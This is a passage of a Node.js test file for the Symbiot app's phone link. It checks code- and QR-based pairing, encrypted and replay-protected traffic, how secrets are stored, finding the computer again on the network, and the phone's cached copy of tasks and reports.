// Your phone (phone.mjs): the computer and the phone in homes of their own, the
// link between them sealed; finding the computer again (mdns.mjs); the QR that pairs
// (qr.mjs); the phone's copy of your work, what it queues while the computer's away,
// and the relay (relay/) that carries it away from home. This process is the phone;
// the computer is a child process with its own HOME, driven over stdin.
//
//   node test/phone.mjs
//
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { spawn, execSync } from "node:child_process";
import { createServer } from "node:net";
import { createInterface } from "node:readline";

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..");
const ROOT = mkdtempSync(join(tmpdir(), "symbiot-phone-"));
const PH = join(ROOT, "phone"), PC = join(ROOT, "computer"), CFG = join(PH, ".config", "symbiot"), PCFG = join(PC, ".config", "symbiot");
mkdirSync(CFG, { recursive: true }); mkdirSync(PCFG, { recursive: true });
process.env.HOME = PH; process.env.USERPROFILE = PH;
process.env.SYMBIOT_NO_ADB = "1"; process.env.SYMBIOT_NO_MDNS = "1"; process.env.SYMBIOT_NO_POLL = "1"; delete process.env.SYMBIOT_ANDROID_APP; delete process.env.SYMBIOT_RELAY; delete process.env.SYMBIOT_NO_RELAY;
let pass = 0, fail = 0;
const ok = (n, c, got) => { if (c) { pass++; console.log("  ✓ " + n); } else { fail++; console.log("  ✗ " + n + (got !== undefined ? "  got: " + JSON.stringify(got).slice(0, 900) : "")); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const freePort = () => new Promise((r) => { const s = createServer().listen(0, "127.0.0.1", () => { const p = s.address().port; s.close(() => r(p)); }); });
const readJ = (f, d = null) => { try { return JSON.parse(readFileSync(f, "utf8")); } catch { return d; } };

// The computer: phone.mjs in its own HOME, its approve recorded rather than run.
writeFileSync(join(ROOT, "computer.mjs"), `
  import { createInterface } from "node:readline";
  import { readFileSync } from "node:fs";
  const p = await import(${JSON.stringify(pathToFileURL(join(SRC, "phone.mjs")).href)});
  const t = await import(${JSON.stringify(pathToFileURL(join(SRC, "tasks.mjs")).href)});
  const w = await import(${JSON.stringify(pathToFileURL(join(SRC, "watch.mjs")).href)});
  const approved = [];
  p.setPhoneApprove(async (repo, untasked) => { approved.push({ repo, untasked }); return { ok: true, pr: "https://github.com/me/demo/pull/7" }; });
  const cmds = { on: () => p.setPhoneLink(true), off: () => p.setPhoneLink(false), code: () => p.newCode(), usbcode: () => p.newCode({ usb: true }), state: (a) => p.linkState(a.later ? { now: Date.now() + a.later } : {}), unpair: (a) => p.unpairPhone(a.id),
    approved: () => approved, add: (a) => t.addTask(a.text, a.repo || ""), toggle: (a) => t.toggleTask(a.id), tasks: () => JSON.parse(readFileSync(${JSON.stringify(join(PCFG, "tasks.json"))}, "utf8")),
    // adb's device list, round by round (each a 30 s tick): what each round pushed, and every adb call
    adb: (a) => { const calls = []; let now = ""; const run = (x) => { calls.push(x.join(" ")); return x[0] === "devices" ? "List of devices attached\\n" + now.split(",").filter(Boolean).map((d) => d.includes("=") ? d.replace("=", "\\t") : d + "\\tdevice").join("\\n") + "\\n" : ""; };
      const did = a.rounds.map((r) => { now = r; return p.adbLink({ run, has: () => true, ...(a.later ? { now: Date.now() + a.later } : {}) }); }); return { did, calls }; },
    snapshot: () => p.snapshot({ fresh: true }), loaded: () => typeof w.newsAfter,
    // a port another program holds when the link starts: it listens by itself once that one lets go
    taken: async () => { const net = await import("node:net"), back = p.linkState().port;
      const hold = await new Promise((r) => { const s = net.createServer().listen(0, "0.0.0.0", () => r(s)); }), port = hold.address().port;
      const held = await p.usePhonePort(port); await new Promise((r) => hold.close(r));
      for (let i = 0; i < 40 && !p.linkState().listening; i++) await new Promise((r) => setTimeout(r, 50));
      const later = p.linkState(); await p.usePhonePort(back); return { port, held, later: { listening: later.listening, port: later.port, error: later.error } }; },
    // two agents ask; Home drops one (closing the Symbiot Browser is an agent's wait, not the user's)
    asking: async () => { const { mkdirSync, writeFileSync, rmSync } = await import("node:fs"), lanes = ["atlas", "reef"].map((n) => ${JSON.stringify(PC)} + "/" + n);
      lanes.forEach((l, i) => { mkdirSync(l + "/.symbiot", { recursive: true }); writeFileSync(l + "/.symbiot/QUESTIONS.md", i ? "## Questions\\n### Can you close the Symbiot Browser so I can carry on?\\n- Done (recommended)\\n- Skip\\n" : "## Questions\\n### Which number should the test call go to?\\n- Yours (recommended)\\n- Skip\\n"); });
      writeFileSync(${JSON.stringify(join(PCFG, "runs.json"))}, JSON.stringify(lanes.map((path) => ({ path, name: path.split("/").pop(), startedAt: Date.now() - 60000 }))));
      const s = await p.snapshot({ fresh: true }); rmSync(${JSON.stringify(join(PCFG, "runs.json"))}, { force: true }); return s.asks.map((a) => a.name); } };
  createInterface({ input: process.stdin }).on("line", async (l) => {
    const m = JSON.parse(l);
    if (m.cmd === "exit") { p.stopPhoneLink(); process.exit(0); }
    try { process.stdout.write(JSON.stringify({ id: m.id, r: await cmds[m.cmd](m.args || {}) }) + "\\n"); } catch (e) { process.stdout.write(JSON.stringify({ id: m.id, error: String((e && e.stack) || e) }) + "\\n"); }
  });
  process.stdout.write(JSON.stringify({ ready: true }) + "\\n");
`);
function startComputer(env = {}) {
  const child = spawn(process.execPath, [join(ROOT, "computer.mjs")], { env: { ...process.env, HOME: PC, USERPROFILE: PC, SYMBIOT_NO_MDNS: "1", SYMBIOT_NO_RELAY: "1", SYMBIOT_NO_POLL: "1", SYMBIOT_PHONE_RETRY_MS: "100", ...env }, stdio: ["pipe", "pipe", "pipe"] });
  const waiting = new Map(); let n = 0, err = "";
  const ready = new Promise((res) => {
    createInterface({ input: child.stdout }).on("line", (l) => { let m; try { m = JSON.parse(l); } catch { return; } if (m.ready) return res(); const w = waiting.get(m.id); if (w) { waiting.delete(m.id); w(m.error ? { error: m.error } : m.r); } });
  });
  child.stderr.on("data", (d) => { err += d; });
  const cmd = (c, args) => new Promise((res) => { const id = ++n; waiting.set(id, res); child.stdin.write(JSON.stringify({ id, cmd: c, args }) + "\n"); setTimeout(() => { if (waiting.has(id)) { waiting.delete(id); res({ error: "timeout " + c + " " + err.slice(-400) }); } }, 30000); });
  return { ready, cmd, stop: () => new Promise((res) => { child.on("exit", res); try { child.stdin.write(JSON.stringify({ cmd: "exit" }) + "\n"); } catch { res(); } setTimeout(() => { try { child.kill("SIGKILL"); } catch {} }, 3000); }), err: () => err };
}

// A repo on the computer with an agent's work waiting for Approve.
const REPO = join(PC, "work", "demo"); mkdirSync(REPO, { recursive: true });
execSync("git init -q -b main && echo one > a.txt && git add . && git -c user.email=a@b -c user.name=a commit -q -m init && echo two >> a.txt", { cwd: REPO });
const port = await freePort();
writeFileSync(join(PCFG, "config.json"), JSON.stringify({ phoneLink: { port }, scanRoots: [join(PC, "work")] }));
writeFileSync(join(PCFG, "tasks.json"), JSON.stringify([
  { id: "t1", text: "Write the release notes", repo: "", done: false, ts: 1 },
  { id: "t2", text: "Check the invoices", repo: "", done: false, ts: 1 },
  { id: "r1", text: "Fix the login page", repo: "demo", done: false, review: true, ts: 1 },
]));
const since0 = Date.now() - 1000;
writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "o", watch: "w1", name: "Inbox", ts: since0 - 60000, text: "Old mail" }], briefs: [] }));
const putNews = (since) => writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "a", watch: "w1", name: "Inbox", ts: since + 10, text: "Sam, Contract signed" }, { id: "b", watch: "w1", name: "Inbox", ts: since + 10, text: "Ann, Lunch?" }], briefs: [] }));

const P = await import("../phone.mjs");
const told = [], notify = (t, b) => told.push([t, b]);
// what crossed the network, as the phone saw it (to check none of it is plain)
const wire = [];
const tapFetch = async (url, o = {}) => { const r = await fetch(url, o); const text = await r.text(); wire.push(String(o.body || "") + "\n" + text); return new Response(text, { status: r.status, headers: r.headers }); };
let pc = startComputer();
try {
  await pc.ready;
  const BASE = `http://127.0.0.1:${port}`;

  console.log("1. SEALED — paired with a key both sides agree, everything after sealed");
  const on = await pc.cmd("on");
  ok("switched on: it listens, with a code, a key fingerprint, and the QR's link", on.listening && /^\d{6}$/.test(on.code) && on.fp && /^https:\/\/symbiot\.co\.za\/pair#a=.*&p=\d+&c=\d{6}&k=/.test(on.link) && /^<svg/.test(on.qr || ""), { ...on, qr: (on.qr || "").slice(0, 30) });
  // a phone on adb, before any is paired: the pair link goes to a cable's phone once, never over Wi-Fi adb
  const WIFI = "192.168.1.64:37365,adb-R5GL349LL7K-a1b2c3._adb-tls-connect._tcp";
  const ab = await pc.cmd("adb", { rounds: ["ABC123,XYZ=unauthorized," + WIFI, "ABC123," + WIFI, WIFI, "", "ABC123," + WIFI] });
  const pushes = (re) => ab.calls.filter((c) => / shell am start /.test(c) && re.test(c)).length;
  ok("adbLink: a cable's phone gets adb reverse and one am start with the pair link (not the unauthorised one)",
    ab.did[0].join() === "ABC123" && ab.calls.filter((c) => /^-s ABC123 reverse tcp:\d+ tcp:\d+$/.test(c)).length === 1 &&
    ab.calls.filter((c) => /^-s ABC123 shell am start -a android.intent.action.VIEW -d 'symbiot:\/\/pair\?a=127\.0\.0\.1&p=\d+&c=\d{6}&k=[\w-]+&n=[^']+' co.symbiot.app$/.test(c)).length === 1 && !ab.calls.some((c) => /XYZ/.test(c)), ab);
  ok("adbLink: a phone on Wi-Fi adb (host:port or an mDNS name) is never opened, round after round", !ab.calls.some((c) => /^-s (192\.168|adb-)/.test(c)), ab.calls);
  ok("adbLink: a cable's phone that drops out and comes back isn't opened again", pushes(/ABC123/) === 1 && ab.did.slice(1).every((d) => !d.length), ab.did);
  const hello = await (await fetch(BASE + "/phone/hello")).json();
  ok("/phone/hello gives the computer's public key and its fingerprint (the QR's k)", hello.pub && hello.fp === on.fp, hello);
  const oldPair = await fetch(BASE + "/phone/pair", { method: "POST", body: JSON.stringify({ code: on.code, name: "Old" }) });
  ok("a phone's Symbiot from before (a plain code) is told to update, and doesn't pair", oldPair.status === 400 && /Update Symbiot on this phone/.test((await oldPair.json()).error), oldPair.status);
  const wrong = await P.pairComputer(`127.0.0.1:${port}`, on.code === "000000" ? "111111" : "000000", { fetchFn: tapFetch });
  ok("a wrong code doesn't pair", !wrong.paired && /isn't right/.test(wrong.error || ""), wrong);
  const paired = await P.pairComputer(`127.0.0.1:${port}`, on.code, { name: "Pixel", fetchFn: tapFetch });
  ok("the right code pairs", paired.paired && !paired.error && paired.name, paired);
  const pcfg = readJ(join(CFG, "config.json")), psec = readJ(join(CFG, "secrets.json"));
  ok("the phone pins the computer's key; its token and the shared key are in secrets.json, not config.json", pcfg.computer.fp === on.fp && pcfg.computer.pub === hello.pub && !JSON.stringify(pcfg).includes(psec.computerSecret.token) && psec.computerSecret.key, pcfg.computer);
  const ccfg = readJ(join(PCFG, "config.json")), csec = readJ(join(PCFG, "secrets.json"));
  ok("10. the computer keeps only a hash of the phone's token, and its private key in secrets.json", ccfg.phoneLink.phones.length === 1 && ccfg.phoneLink.phones[0].hash && !("token" in ccfg.phoneLink.phones[0]) && !readFileSync(join(PCFG, "config.json"), "utf8").includes(psec.computerSecret.token) && csec.phoneSecret.priv && !JSON.stringify(ccfg).includes(csec.phoneSecret.priv), ccfg.phoneLink);
  const since = pcfg.computer.since; putNews(since);
  const poll = await P.pollComputer({ fetchFn: tapFetch, notify, discover: async () => [] });
  ok("what's new arrives and is notified, one per watch per read", poll.shown === 1 && told.length === 1 && /2 new · Inbox/.test(told[0][0]) && /Contract signed/.test(told[0][1]) && !poll.error, [poll, told]);
  ok("nothing that crossed the network is plain: no subject, no task, no token", wire.length >= 3 && !wire.some((w) => /Contract signed|Lunch|release notes|invoices|Fix the login/.test(w) || w.includes(psec.computerSecret.token)), wire.map((w) => w.slice(0, 120)));
  const plain = await fetch(BASE + "/phone/news", { method: "POST", body: JSON.stringify({ since: 0 }) });
  ok("a raw request without the sealed envelope gets 403", plain.status === 403, plain.status);
  const legacy = await fetch(BASE + "/phone/news?since=0", { headers: { "x-symbiot-phone": "anything" } });
  ok("a phone paired before (a plain token) gets 403 and is told to pair again", legacy.status === 403 && /pair it again/i.test((await legacy.json()).error), legacy.status);
  const stranger = await fetch(BASE + "/phone/state", { method: "POST", body: JSON.stringify({ v: 1, id: "deadbeef", n: "AAAAAAAAAAAAAAAA", c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" }) });
  ok("a stranger's envelope gets 403, plain (there's no key to seal it with)", stranger.status === 403, stranger.status);
  const other = await fetch(BASE + "/api/agentcmd", { method: "POST", body: "{}" });
  ok("nothing else is served there: the app's API isn't reachable", other.status === 404, other.status);
  // a captured request sent again: refused
  const sent = wire.find((w) => /"v":1,"id"/.test(w) && !/"pub"/.test(w)).split("\n")[0];
  const again = await (await fetch(BASE + "/phone/news", { method: "POST", body: sent })).json();
  const key = Buffer.from(psec.computerSecret.key, "base64url"), env0 = JSON.parse(sent), again0 = P.unseal(key, again, "res:" + env0.n);
  ok("a captured request sent again is refused (sealed 409)", again0 && again0.s === 409, again0);
  writeFileSync(join(CFG, "config.json"), JSON.stringify({ ...pcfg, computer: { url: BASE, token: "abc", name: "old", since: 0 } }));
  const was = readJ(join(CFG, "secrets.json")); writeFileSync(join(CFG, "secrets.json"), "{}");
  const oldSt = P.computerState();
  ok("a phone paired before the link was sealed is told to pair again, not left failing", oldSt.paired && oldSt.old && /Pair this phone .* again/.test(oldSt.error), oldSt);
  writeFileSync(join(CFG, "config.json"), JSON.stringify(pcfg)); writeFileSync(join(CFG, "secrets.json"), JSON.stringify(was));

  console.log("10. KEYS — old whole tokens are hashed on first use; the Android app hands its key to the Keystore");
  const c2 = readJ(join(PCFG, "config.json")); c2.phoneLink.phones[0] = { ...c2.phoneLink.phones[0], token: psec.computerSecret.token }; delete c2.phoneLink.phones[0].hash;
  writeFileSync(join(PCFG, "config.json"), JSON.stringify(c2));
  const p2 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  const c3 = readJ(join(PCFG, "config.json")).phoneLink.phones[0];
  ok("a phone entry with its token kept whole still works once, then only its hash is kept", !p2.error && p2.last && c3.hash && !("token" in c3), [p2.error, c3]);
  const ADIR = join(ROOT, "android"); mkdirSync(join(ADIR, ".config", "symbiot"), { recursive: true });
  const code2 = (await pc.cmd("code")).code;
  const runA = (src, env = {}) => new Promise((res) => { const ch = spawn(process.execPath, ["--input-type=module", "-e", src], { env: { ...process.env, HOME: ADIR, USERPROFILE: ADIR, SYMBIOT_ANDROID_APP: "1", ...env } }); let o = "", e = ""; ch.stdout.on("data", (d) => { o += d; }); ch.stderr.on("data", (d) => { e += d; }); ch.on("exit", () => { try { res(JSON.parse(o.trim().split("\n").pop())); } catch { res({ error: e.slice(-600) || o }); } }); });
  const ap = await runA(`const p = await import(${JSON.stringify(pathToFileURL(join(SRC, "phone.mjs")).href)}); const r = await p.pairComputer("127.0.0.1:${port}", "${code2}", { name: "Galaxy" }); console.log(JSON.stringify(r)); process.exit(0);`);
  const aCfg = readFileSync(join(ADIR, ".config", "symbiot", "config.json"), "utf8"), aSec = readJ(join(ADIR, ".config", "symbiot", "secrets.json"), {}), seal = readJ(join(ADIR, ".config", "symbiot", "android-seal.json"));
  ok("on the Android app the token and key go to the app (android-seal.json) for its Keystore, never to config or secrets", ap.paired && seal && seal.token && seal.key && !aCfg.includes(seal.token) && !("computerSecret" in aSec), [ap, aSec]);
  rmSync(join(ADIR, ".config", "symbiot", "android-seal.json"));
  const ap2 = await runA(`const p = await import(${JSON.stringify(pathToFileURL(join(SRC, "phone.mjs")).href)}); const r = await p.pollComputer({ notify: () => {}, discover: async () => [] }); console.log(JSON.stringify(r)); process.exit(0);`, { SYMBIOT_COMPUTER_SECRET: JSON.stringify(seal) });
  ok("…and back in SYMBIOT_COMPUTER_SECRET at the next start, it still asks", !ap2.error && ap2.last > 0, ap2);
  // agents, git, npm and gh inherited it from the environment, which undid keeping it in the Keystore
  const ap4 = await runA(`const p = await import(${JSON.stringify(pathToFileURL(join(SRC, "phone.mjs")).href)}); const { execFileSync } = await import("node:child_process");
    const child = execFileSync(process.execPath, ["-p", "Object.keys(process.env).includes(\\"SYMBIOT_COMPUTER_SECRET\\")"], { encoding: "utf8" }).trim();
    const r = await p.pollComputer({ notify: () => {}, discover: async () => [] });
    console.log(JSON.stringify({ child, mine: "SYMBIOT_COMPUTER_SECRET" in process.env, relaunch: JSON.parse(p.relaunchEnv().SYMBIOT_COMPUTER_SECRET || "{}").token === ${JSON.stringify(seal.token)}, last: r.last, error: r.error })); process.exit(0);`, { SYMBIOT_COMPUTER_SECRET: JSON.stringify(seal) });
  ok("…read once at start and taken out of the environment: a process it spawns doesn't get it, and it still asks", ap4.child === "false" && ap4.mine === false && ap4.last > 0 && !ap4.error, ap4);
  ok("…only Symbiot relaunching itself after an update is handed it (relaunchEnv)", ap4.relaunch === true, ap4);
  // Android's own discovery (the app's service) took about 9.5 s for one computer; Node gave up at 8
  const nsdFile = join(ADIR, ".config", "symbiot", "android-nsd.json");
  const ap5 = await runA(`const p = await import(${JSON.stringify(pathToFileURL(join(SRC, "phone.mjs")).href)}); const fs = await import("node:fs");
    setTimeout(() => fs.writeFileSync(${JSON.stringify(nsdFile)}, JSON.stringify([{ name: "Symbiot-1a2b", port: 7392, addresses: ["192.168.8.50"], fp: "abc" }])), 9600);
    const f = await p.findComputers(); console.log(JSON.stringify({ f })); process.exit(0);`);
  ok("on the Android app, a computer its discovery finds after 9.6 s is still found", ap5.f && ap5.f.length === 1 && ap5.f[0].url === "http://192.168.8.50:7392" && ap5.f[0].fp === "abc", ap5);
  const ap3 = await runA(`const p = await import(${JSON.stringify(pathToFileURL(join(SRC, "phone.mjs")).href)}); console.log(JSON.stringify(p.computerState())); process.exit(0);`);
  ok("…without it (the Keystore's key gone), it says to pair again", ap3.old && /pair/i.test(ap3.error || ""), ap3);

  console.log("5. BACK BY ITSELF — another address, found again, never unpaired by a network error");
  const cfgNow = readJ(join(CFG, "config.json")); cfgNow.computer.url = "http://127.0.0.1:1"; cfgNow.computer.urls = ["http://127.0.0.1:1", BASE]; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgNow));
  const p5 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("the last address fails, another it gave at pairing answers: that's the address now", !p5.error && readJ(join(CFG, "config.json")).computer.url === BASE, [p5.error, readJ(join(CFG, "config.json")).computer.url]);
  const cfgGone = readJ(join(CFG, "config.json")); cfgGone.computer.url = "http://127.0.0.1:1"; cfgGone.computer.urls = ["http://127.0.0.1:1"]; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgGone));
  let asked = null;
  const p6 = await P.pollComputer({ notify: () => {}, discover: async (c) => { asked = c.fp; return [BASE]; } });
  ok("none of them answers: it looks for the computer by its key's fingerprint (mDNS), and keeps the address it found", !p6.error && asked === on.fp && readJ(join(CFG, "config.json")).computer.url === BASE, [p6.error, asked]);
  // another device has the computer's old address now, and answers anything plain: not the computer, so on to the next route
  const { createServer: httpServer } = await import("node:http");
  const strangerSrv = httpServer((req, res) => { req.resume(); req.on("end", () => { res.writeHead(403, { "content-type": "application/json" }); res.end('{"error":"Forbidden"}'); }); });
  await new Promise((r) => strangerSrv.listen(0, "127.0.0.1", r));
  const STRANGER = `http://127.0.0.1:${strangerSrv.address().port}`;
  const cfgS = readJ(join(CFG, "config.json")); cfgS.computer.url = STRANGER; cfgS.computer.urls = [STRANGER]; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgS));
  const pS = await P.pollComputer({ notify: () => {}, discover: async () => [BASE] });
  ok("a stranger at the old address answering a plain 403 isn't taken for the computer: it looks further, finds it, and keeps that address", !pS.error && readJ(join(CFG, "config.json")).computer.url === BASE, [pS.error, readJ(join(CFG, "config.json")).computer.url]);
  cfgS.computer.url = STRANGER; cfgS.computer.urls = [STRANGER]; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgS));
  const pS2 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…and with only the stranger there, the computer is out of reach, not \"isn't paired\", and the stranger's address isn't kept", /Couldn't reach/.test(pS2.error || "") && pS2.paired && readJ(join(CFG, "config.json")).computer.url === STRANGER, [pS2.error]);
  cfgS.computer.url = BASE; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgS)); await P.pollComputer({ notify: () => {}, discover: async () => [] }); // back, for what follows
  strangerSrv.close();
  const cfgOff = readJ(join(CFG, "config.json")); cfgOff.computer.url = "http://127.0.0.1:1"; cfgOff.computer.urls = []; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgOff));
  const f1 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("a network error never clears the pairing", f1.paired && !f1.away && readJ(join(CFG, "config.json")).computer.id && readJ(join(CFG, "secrets.json")).computerSecret, f1);

  console.log("7. OUT OF REACH — one calm line, with when it last heard");
  const f2 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("failed more than one round: away, with the time it last heard from the computer", f2.away && f2.heard > 0 && f2.paired, f2);
  writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgNow)); cfgNow.computer.url = BASE; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgNow));
  const f3 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…gone with the next good poll", !f3.away && !f3.error, f3);
  // news and the copy had 6 s in all, so a busy computer read as away; a dead address still costs only the quick hello
  const slow = async (url, o = {}) => { if (/\/phone\/news$/.test(url)) { await sleep(6500); if (o.signal && o.signal.aborted) throw new Error("aborted"); } return fetch(url, o); };
  const cfgSlow = readJ(join(CFG, "config.json")); cfgSlow.computer.urls = ["http://10.255.255.1:7392", BASE]; cfgSlow.computer.url = "http://10.255.255.1:7392"; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgSlow));
  const t9 = Date.now(), fS = await P.pollComputer({ fetchFn: slow, notify: () => {}, discover: async () => [] }), took = Date.now() - t9;
  ok("a computer slow to answer (6.5 s) still answers, after an address with nothing there cost only its quick hello", !fS.error && fS.last >= t9 && took < 6500 + 3000 + 4000, [fS.error, took]);
  // the offset used to be set once, at pairing: 10 minutes of drift since, and every request was refused as old
  const cfgClock = readJ(join(CFG, "config.json")); cfgClock.computer.offset = -20 * 60000; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgClock));
  const fC = await P.pollComputer({ notify: () => {}, discover: async () => [] }), offC = readJ(join(CFG, "config.json")).computer.offset;
  ok("the clocks 20 minutes apart since pairing: refused once as old, set by the computer's clock in that answer, and asked again", !fC.error && fC.last && Math.abs(offC) < 2000, [fC.error, offC]);
  cfgClock.computer.offset = 8000; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgClock));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…and a few seconds' drift is set right by the time each news answer carries", Math.abs(readJ(join(CFG, "config.json")).computer.offset) < 2000, readJ(join(CFG, "config.json")).computer.offset);

  console.log("6. THE COPY — your work on the phone, shown with the computer off");
  const copy = readJ(join(CFG, "computer.json"));
  ok("the phone keeps the computer's tasks, what needs you and its Approve, in computer.json", copy && copy.v && copy.tasks.some((t) => t.text === "Write the release notes") && copy.approves.some((a) => a.repo === "demo" && a.tasks[0].id === "r1" && a.files === 1 && a.sum) && Array.isArray(copy.needs) && Array.isArray(copy.asks), copy && { ...copy, tasks: copy.tasks.length });
  const st1 = await (await import("../phone.mjs")).computerView();
  ok("the view is that copy, with the computer's name", st1.copy && st1.copy.v === copy.v && st1.name, Object.keys(st1));
  const before = readJ(join(CFG, "computer.json")).got;
  await sleep(20);
  const wire0 = wire.length; await P.pollComputer({ fetchFn: tapFetch, notify: () => {}, discover: async () => [] });
  const last = wire[wire.length - 1].split("\n");
  const stReply = P.unseal(key, JSON.parse(last[1]), "res:" + JSON.parse(last[0]).n);
  ok("unchanged since: the state request costs nothing (304), and the copy is kept", stReply && stReply.s === 304 && readJ(join(CFG, "computer.json")).v === copy.v && readJ(join(CFG, "computer.json")).got > before && wire.length > wire0, stReply);

  console.log("6. YOUR COMPUTER'S REPORTS — read on the phone, from the copy");
  const rdir = join(PCFG, "drafts", "act-reports", ".symbiot"); mkdirSync(rdir, { recursive: true });
  writeFileSync(join(rdir, "PRICING-AUDIT.md"), "# Pricing audit\n\nThree plans checked against **what people pay**.\n\n- Free: fine\n- Pro: too cheap\n");
  writeFileSync(join(rdir, "LONG-PLAN.md"), "# A long plan\n\n" + Array.from({ length: 400 }, (_, i) => `Step ${i + 1}: something to do, written out in full so it takes room.`).join("\n\n") + "\n");
  for (let i = 0; i < 10; i++) writeFileSync(join(rdir, `OLDER-${i}.md`), `# Older ${i}\n\nold\n`);
  const t0 = Date.now() - 3600000; for (let i = 0; i < 10; i++) { const f = join(rdir, `OLDER-${i}.md`); (await import("node:fs")).utimesSync(f, new Date(t0 - i * 1000), new Date(t0 - i * 1000)); }
  await sleep(5200); // the computer's copy is kept 5 s
  const wireR = wire.length; await P.pollComputer({ fetchFn: tapFetch, notify: () => {}, discover: async () => [] });
  const withR = readJ(join(CFG, "computer.json"));
  const reps = (withR && withR.reports) || [];
  const withText = reps.filter((r) => typeof r.text === "string");
  ok("the copy carries the computer's newest reports, newest first: the text of the first 5 and of unread ones up to 8, the rest listed to open", reps.length === 12 && withText.length === P.PHONE_TEXTS && reps.slice(0, 2).every((r) => typeof r.text === "string") && reps.some((r) => r.title === "Pricing audit")
    && reps.filter((r) => r.more).length === 4 && reps.filter((r) => r.more).every((r) => !("text" in r) && /^Older/.test(r.title)), reps.map((r) => [r.title, typeof r.text, !!r.more]));
  ok("…each unread as it is on the computer, so the phone's Reports opens on them, not on an empty Unread", reps.every((r) => r.new === true), reps.map((r) => r.new));
  const long = reps.find((r) => r.title === "A long plan");
  ok("…a long one cut at a paragraph, so the copy fits through the relay; it says so", long && long.cut && long.text.length <= P.REPORT_CAP && /\.$/.test(long.text), long && [long.cut, long.text.length]);
  ok("…sealed on the way, like the rest", !wire.slice(wireR).some((w) => /Pricing audit|too cheap/.test(w)), "");
  const RP = await import("../reports.mjs"), pcopy = P.computerCopy(), listed = RP.phoneReports(pcopy);
  ok("the phone's Reports lists them, from the computer, by its name", listed.length === reps.length && listed.every((r) => r.id.startsWith("pc:") && r.computer === pcopy.from && r.file.startsWith(pcopy.from + ":")), listed.slice(0, 2));
  const one = RP.phoneReport(pcopy, listed.find((r) => r.title === "Pricing audit").id), cutOne = RP.phoneReport(pcopy, listed.find((r) => r.title === "A long plan").id);
  ok("…and opens one from the copy, offline too: its text as the page, nothing to ask or tick into ideas there", one.remote && /<b>what people pay<\/b>/.test(one.html) && !one.ideas.length && !one.draft, one && one.html);
  ok("…a cut one says the rest is on the computer", new RegExp("the rest is on " + pcopy.from).test(cutOne.html || ""), cutOne && (cutOne.html || "").slice(-200));
  ok("…one no longer in the copy says so", /isn't in the copy/.test(RP.phoneReport(pcopy, "pc:nope").error || ""), "");
  const after = RP.phoneReports(P.computerCopy());
  ok("…opened here, it's read here (the rest stay unread)", after.find((r) => r.title === "Pricing audit").new === false && after.find((r) => r.title === "A long plan").new === false && after.filter((r) => r.new).length === reps.length - 2, after.map((r) => [r.title, r.new]));
  const older = listed.find((r) => r.title === "Older 9");
  ok("…one listed without its text needs the computer to open", RP.phoneReportNeedsText(pcopy, older.id) && !RP.phoneReportNeedsText(pcopy, listed.find((r) => r.title === "Pricing audit").id), older);
  const fetched = await P.pcReportText(older.id, { fetchFn: tapFetch }), olderOne = RP.phoneReport(pcopy, older.id, { fetched });
  ok("…and opens with its text asked from the computer, sealed like the rest", fetched.text === "# Older 9\n\nold\n" && /old/.test(olderOne.html) && olderOne.remote && !wire.slice(-1).some((w) => /Older 9/.test(w)), [fetched, olderOne.html]);
  const away = RP.phoneReport(pcopy, older.id, { fetched: { error: "Your computer is out of reach, and this report's text stays there until it's back." } });
  ok("…out of reach, it says so in its place, not a blank page", /out of reach/.test(away.html) && away.text === "", away.html);
  ok("the copy carries the computer's Dashboard too: its cards, for the phone's Dashboard", withR.board && Array.isArray(withR.board.cards) && withR.board.hours === 24, withR.board);
  const pb = P.boardForPhone({ hours: 24, total: 2, cards: [{ id: "w1", name: "GitHub", url: "https://github.com/notifications", source: "github", count: 2, label: "2 notifications", checked: 1793110000123, chat: [{ me: true, text: "secret talk" }],
    items: [{ id: "a", text: "PR #316 merged", ts: 1, href: "https://github.com/x/y/pull/316", mail: { to: "x" }, need: true }, { id: "b", text: "CI failed", ts: 2 }] }] });
  ok("…in plain words, without what only the computer acts on (its chat, a draft's mail)", pb.cards.length === 1 && pb.cards[0].count === 2 && pb.cards[0].items.length === 2 && pb.cards[0].items[0].href && !("mail" in pb.cards[0].items[0]) && !("chat" in pb.cards[0]) && pb.cards[0].checked % 600000 === 0, pb);
  ok("a computer has no copy: its own Reports stay as they were", RP.phoneReports(null).length === 0, "");

  console.log("6. WHAT NEEDS YOU — told on the phone when it's new, not only shown");
  const cf = join(CFG, "computer.json"), c0 = readJ(cf);
  writeFileSync(cf, JSON.stringify({ ...c0, v: "older", approves: [] })); // as if the demo work wasn't waiting at the last look
  const toldW = []; await P.pollComputer({ notify: (t, b) => toldW.push([t, b]), discover: async () => [] });
  ok("work newly waiting for your Approve: one notification, saying where and what", toldW.length === 1 && /^1 thing needs you · ./.test(toldW[0][0]) && /^demo: 1 task done, waiting for your Approve$/.test(toldW[0][1]), toldW);
  const toldW2 = []; await P.pollComputer({ notify: (t, b) => toldW2.push([t, b]), discover: async () => [] });
  ok("…and not again while it waits", toldW2.length === 0, toldW2);
  const W = (o) => ({ asks: [], approves: [], needs: [], ...o }), ask1 = { id: "ask:1", name: "symbiot", questions: [{ q: "Push the fix?" }] };
